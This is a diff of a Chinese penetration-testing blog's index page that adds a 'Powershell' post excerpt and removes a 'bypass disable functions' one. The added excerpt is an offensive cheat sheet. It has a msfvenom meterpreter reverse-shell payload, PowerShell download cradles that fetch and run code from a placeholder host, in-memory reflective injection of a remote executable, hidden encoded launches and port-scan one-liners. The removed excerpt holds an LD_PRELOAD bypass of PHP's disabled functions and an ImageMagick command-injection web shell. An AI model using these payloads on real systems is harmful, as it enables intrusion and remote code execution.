@@ -117,6 +117,142 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
+			<a href="/2018/06/13/powershell-pen.html" >Powershell</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2018-06-13  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<pre class="line-numbers language-none"><code class="language-none">反弹123端口的powershell
+msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;x.x.x. LPORT&#x3D;123 -f psh-reflection &gt;123.ps1
+powershell.exe -exec Bypass -nop -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;x.x.x.x&#x2F;123.ps1&#39;)&quot;
+
+
+端口扫描:
+powershell -exec bypass -c &quot;444..446 | % &#123;echo ((new-object Net.Sockets.TcpClient).Connect(&#39;x.x.x.x&#39;,$_)) &quot;Port $_ is open!&quot;&#125; 2&gt;$null&quot;
+
+自定义端口和IP
+1..20 | % &#123; $a &#x3D; $_; 1..1024 | % &#123;echo ((new-object Net.Sockets.TcpClient).Connect(&quot;192.168.1.$a&quot;,$_)) &quot;Port $_ is open!&quot;&#125; 2&gt;$null&#125;
+
+
+1..20 | % &#123; $a &#x3D; $_; write-host &quot;------&quot;; write-host &quot;192.168.1.$a&quot;; 22,53,80,445 | % &#123;echo ((new-object Net.Sockets.TcpClient).Connect(&quot;10.0.0.$a&quot;,$_)) &quot;Port $_ is open!&quot;&#125; 2&gt;$null&#125;
+169..171 | % &#123; $a &#x3D; $_; write-host &quot;------&quot;; write-host &quot;103.27.177.$a&quot;; 445 | % &#123;echo ((new-object Net.Sockets.TcpClient).Connect(&quot;10.0.0.$a&quot;,$_)) &quot;Port $_ is open!&quot;&#125; 2&gt;$null&#125;
+
+
+
+powershell.exe -exec Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -enc xxx
+
+内存加载运行:
+powershell.exe -exec bypass -nop -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;clymb3r&#x2F;PowerShell&#x2F;master&#x2F;Invoke-ReflectivePEInjection&#x2F;Invoke-ReflectivePEInjection.ps1&#39;);Invoke-ReflectivePEInjection -PEUrl http:&#x2F;&#x2F;x.x.x.x&#x2F;2.exe -ExeArgs &#39;whoami&#39; -ForceASLR&quot; 
+
+
+下载文件:
+(New-Object System.Net.Webclient).DownloadFile(&quot;http:&#x2F;&#x2F;x.x.x.x&#x2F;k.aspx&quot;,&quot;&quot;)
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ul>
+<li><a target="_blank" rel="noopener" href="http://rcoil.me/2017/04/PowerShell%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/">http://rcoil.me/2017/04/PowerShell%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/</a></li>
+</ul>
+<p>在使用msf生成ps的payload的时候，对于生成的文件格式是hta-psh解码顺序是这样的，对于其中的base64编码，先正常的base64解码，然后提取解码之后中的base64，保存为1.txt，使用如下脚本解码:</p>
+<pre class="line-numbers language-none"><code class="language-none">python decode.py 1.txt
+
+#&#x2F;usr&#x2F;bin&#x2F;env python
+# coding:utf-8
+
+import base64
+import gzip
+import StringIO
+import sys
+
+f &#x3D; sys.argv[1]
+with open(f, &quot;rb&quot;) as file:
+    data &#x3D; file.read()
+
+decoded&#x3D;base64.b64decode(data)
+res &#x3D; StringIO.StringIO(decoded)
+for i in gzip.GzipFile(fileobj&#x3D;res):
+    print i<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+	
+
+	</div>
+  <a type="button" href="/2018/06/13/powershell-pen.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<pre class="line-numbers language-none"><code class="language-none">反弹123端口的powershell
+msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;x.x.x. LPORT&#x3D;123 -f psh-reflection &gt;123.ps1
+powershell.exe -exec Bypass -nop -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;x.x.x.x&#x2F;123.ps1&#39;)&quot;
+
+
+端口扫描:
+powershell -exec bypass -c &quot;444..446 | % &#123;echo ((new-object Net.Sockets.TcpClient).Connect(&#39;x.x.x.x&#39;,$_)) &quot;Port $_ is open!&quot;&#125; 2&gt;$null&quot;
+
+自定义端口和IP
+1..20 | % &#123; $a &#x3D; $_; 1..1024 | % &#123;echo ((new-object Net.Sockets.TcpClient).Connect(&quot;192.168.1.$a&quot;,$_)) &quot;Port $_ is open!&quot;&#125; 2&gt;$null&#125;
+
+
+1..20 | % &#123; $a &#x3D; $_; write-host &quot;------&quot;; write-host &quot;192.168.1.$a&quot;; 22,53,80,445 | % &#123;echo ((new-object Net.Sockets.TcpClient).Connect(&quot;10.0.0.$a&quot;,$_)) &quot;Port $_ is open!&quot;&#125; 2&gt;$null&#125;
+169..171 | % &#123; $a &#x3D; $_; write-host &quot;------&quot;; write-host &quot;103.27.177.$a&quot;; 445 | % &#123;echo ((new-object Net.Sockets.TcpClient).Connect(&quot;10.0.0.$a&quot;,$_)) &quot;Port $_ is open!&quot;&#125; 2&gt;$null&#125;
+
+
+
+powershell.exe -exec Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -enc xxx
+
+内存加载运行:
+powershell.exe -exec bypass -nop -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;clymb3r&#x2F;PowerShell&#x2F;master&#x2F;Invoke-ReflectivePEInjection&#x2F;Invoke-ReflectivePEInjection.ps1&#39;);Invoke-ReflectivePEInjection -PEUrl http:&#x2F;&#x2F;x.x.x.x&#x2F;2.exe -ExeArgs &#39;whoami&#39; -ForceASLR&quot; 
+
+
+下载文件:
+(New-Object System.Net.Webclient).DownloadFile(&quot;http:&#x2F;&#x2F;x.x.x.x&#x2F;k.aspx&quot;,&quot;&quot;)
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ul>
+<li><a target="_blank" rel="noopener" href="http://rcoil.me/2017/04/PowerShell%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/">http://rcoil.me/2017/04/PowerShell%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/</a></li>
+</ul>
+<p>在使用msf生成ps的payload的时候，对于生成的文件格式是hta-psh解码顺序是这样的，对于其中的base64编码，先正常的base64解码，然后提取解码之后中的base64，保存为1.txt，使用如下脚本解码:</p>
+<pre class="line-numbers language-none"><code class="language-none">python decode.py 1.txt
+
+#&#x2F;usr&#x2F;bin&#x2F;env python
+# coding:utf-8
+
+import base64
+import gzip
+import StringIO
+import sys
+
+f &#x3D; sys.argv[1]
+with open(f, &quot;rb&quot;) as file:
+    data &#x3D; file.read()
+
+decoded&#x3D;base64.b64decode(data)
+res &#x3D; StringIO.StringIO(decoded)
+for i in gzip.GzipFile(fileobj&#x3D;res):
+    print i<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+	
+	</div>
+  <a type="button" href="/2018/06/13/powershell-pen.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
 			<a href="/2018/06/05/local-network-pentest.html" >内网渗透注意事项</a>
 		</h3>
 		</div>
@@ -437,144 +573,6 @@ DTD文档类型定义
 </div>
 
 		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2017/12/12/bypass-disabled-functions.html" >bypass disable functions</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2017-12-12  </div>
-		</div>
-	</div>
-	
-
-
-			<!--
-<div class="entry">
-  <div class="row">
-	
-	
-		<p><a target="_blank" rel="noopener" href="https://threathunter.org/topic/596d90d5dff9e14c40b61986">https://threathunter.org/topic/596d90d5dff9e14c40b61986</a></p>
-<pre class="line-numbers language-none"><code class="language-none">#include &lt;stdlib.h&gt;
-#include &lt;stdio.h&gt;
-#include &lt;string.h&gt;
-void payload() &#123;
-system(&quot;echo aaaaa&gt; &#x2F;tmp&#x2F;abc.txt&quot;);
-&#125;
-int geteuid() &#123;
-if (getenv(&quot;LD_PRELOAD&quot;) &#x3D;&#x3D; NULL) &#123; return 0; &#125; 
-unsetenv(&quot;LD_PRELOAD&quot;);
-payload();
-&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<pre class="line-numbers language-none"><code class="language-none">&lt;?php 
-putenv(&quot;LD_PRELOAD&#x3D;&#x2F;var&#x2F;www&#x2F;hack.so&quot;);
-mail(&quot;a[@localhost](&#x2F;user&#x2F;localhost)&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;);
-?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p> 使用方法：</p>
-<pre class="line-numbers language-none"><code class="language-none">gcc -c -fPIC hack.c -o hack
-gcc -shared hack -o hack.so<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p>修改hack.c文件里面的内容即可执行命令，经过测试在lnmp一键安装包可以顺利执行。<br>在gcc编译的时候可以放在其他linux上面编译，好了之后上传到目标服务器。</p>
-<p>====<br>2018.8.22:</p>
-<p>使用imageMagick 绕过:</p>
-<pre class="line-numbers language-none"><code class="language-none">&lt;?php
-echo &quot;Disable Functions: &quot; . ini_get(&#39;disable_functions&#39;) . &quot;\n&quot;;
-
-$command &#x3D; PHP_SAPI &#x3D;&#x3D; &#39;cli&#39; ? $argv[1] : $_GET[&#39;cmd&#39;];
-if ($command &#x3D;&#x3D; &#39;&#39;) &#123;
-    $command &#x3D; &#39;id&#39;;
-&#125;
-
-$exploit &#x3D; &lt;&lt;&lt;EOF
-push graphic-context
-viewbox 0 0 640 480
-fill &#39;url(https:&#x2F;&#x2F;example.com&#x2F;image.jpg&quot;|$command&quot;)&#39;
-pop graphic-context
-EOF;
-
-file_put_contents(&quot;KKKK.mvg&quot;, $exploit);
-$thumb &#x3D; new Imagick();
-$thumb-&gt;readImage(&#39;KKKK.mvg&#39;);
-$thumb-&gt;writeImage(&#39;KKKK.png&#39;);
-$thumb-&gt;clear();
-$thumb-&gt;destroy();
-unlink(&quot;KKKK.mvg&quot;);
-unlink(&quot;KKKK.png&quot;);
-?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>上面的比较老，最新的imagemagic漏洞:</p>
-	
-
-	</div>
-  <a type="button" href="/2017/12/12/bypass-disabled-functions.html#more" class="btn btn-default more">Read More</a>
-</div>
-
--->
-<div class="entry">
-  <div class="row">
-	
-	
-		<p><a target="_blank" rel="noopener" href="https://threathunter.org/topic/596d90d5dff9e14c40b61986">https://threathunter.org/topic/596d90d5dff9e14c40b61986</a></p>
-<pre class="line-numbers language-none"><code class="language-none">#include &lt;stdlib.h&gt;
-#include &lt;stdio.h&gt;
-#include &lt;string.h&gt;
-void payload() &#123;
-system(&quot;echo aaaaa&gt; &#x2F;tmp&#x2F;abc.txt&quot;);
-&#125;
-int geteuid() &#123;
-if (getenv(&quot;LD_PRELOAD&quot;) &#x3D;&#x3D; NULL) &#123; return 0; &#125; 
-unsetenv(&quot;LD_PRELOAD&quot;);
-payload();
-&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<pre class="line-numbers language-none"><code class="language-none">&lt;?php 
-putenv(&quot;LD_PRELOAD&#x3D;&#x2F;var&#x2F;www&#x2F;hack.so&quot;);
-mail(&quot;a[@localhost](&#x2F;user&#x2F;localhost)&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;);
-?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p> 使用方法：</p>
-<pre class="line-numbers language-none"><code class="language-none">gcc -c -fPIC hack.c -o hack
-gcc -shared hack -o hack.so<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p>修改hack.c文件里面的内容即可执行命令，经过测试在lnmp一键安装包可以顺利执行。<br>在gcc编译的时候可以放在其他linux上面编译，好了之后上传到目标服务器。</p>
-<p>====<br>2018.8.22:</p>
-<p>使用imageMagick 绕过:</p>
-<pre class="line-numbers language-none"><code class="language-none">&lt;?php
-echo &quot;Disable Functions: &quot; . ini_get(&#39;disable_functions&#39;) . &quot;\n&quot;;
-
-$command &#x3D; PHP_SAPI &#x3D;&#x3D; &#39;cli&#39; ? $argv[1] : $_GET[&#39;cmd&#39;];
-if ($command &#x3D;&#x3D; &#39;&#39;) &#123;
-    $command &#x3D; &#39;id&#39;;
-&#125;
-
-$exploit &#x3D; &lt;&lt;&lt;EOF
-push graphic-context
-viewbox 0 0 640 480
-fill &#39;url(https:&#x2F;&#x2F;example.com&#x2F;image.jpg&quot;|$command&quot;)&#39;
-pop graphic-context
-EOF;
-
-file_put_contents(&quot;KKKK.mvg&quot;, $exploit);
-$thumb &#x3D; new Imagick();
-$thumb-&gt;readImage(&#39;KKKK.mvg&#39;);
-$thumb-&gt;writeImage(&#39;KKKK.png&#39;);
-$thumb-&gt;clear();
-$thumb-&gt;destroy();
-unlink(&quot;KKKK.mvg&quot;);
-unlink(&quot;KKKK.png&quot;);
-?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>上面的比较老，最新的imagemagic漏洞:</p>
-	
-	</div>
-  <a type="button" href="/2017/12/12/bypass-disabled-functions.html#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -632,7 +630,7 @@ unlink(&quot;KKKK.png&quot;);
 		
 			<li><a href="/categories/PWN/">PWN<span>2</span></a></li>
 		
-			<li><a href="/categories/Pentest/">Pentest<span>50</span></a></li>
+			<li><a href="/categories/Pentest/">Pentest<span>51</span></a></li>
 		
 			<li><a href="/categories/Python/">Python<span>5</span></a></li>
 		
@@ -653,6 +651,10 @@ unlink(&quot;KKKK.png&quot;);
   <ul class="entry list-unstyled">
     
       <li>
+        <a href="/2023/04/20/BrokenSesame-Alibaba-Cloud-Database-Services-RCE.html" ><i class="fa fa-file-o"></i>BrokenSesame-阿里云数据库远程命令执行</a>
+      </li>
+    
+      <li>
         <a href="/2023/03/27/pinfish-and-osx-pentest.html" ><i class="fa fa-file-o"></i>记一次钓鱼演练和OS X下的渗透技巧</a>
       </li>
     
@@ -666,10 +668,6 @@ unlink(&quot;KKKK.png&quot;);
     
       <li>
         <a href="/2023/02/13/cname-hijack-openresty.html" ><i class="fa fa-file-o"></i>利用OpenResty进行域名流量劫持</a>
-      </li>
-    
-      <li>
-        <a href="/2023/01/16/pay_vuln.html" ><i class="fa fa-file-o"></i>支付接口安全测试记录</a>
       </li>
     
   </ul>
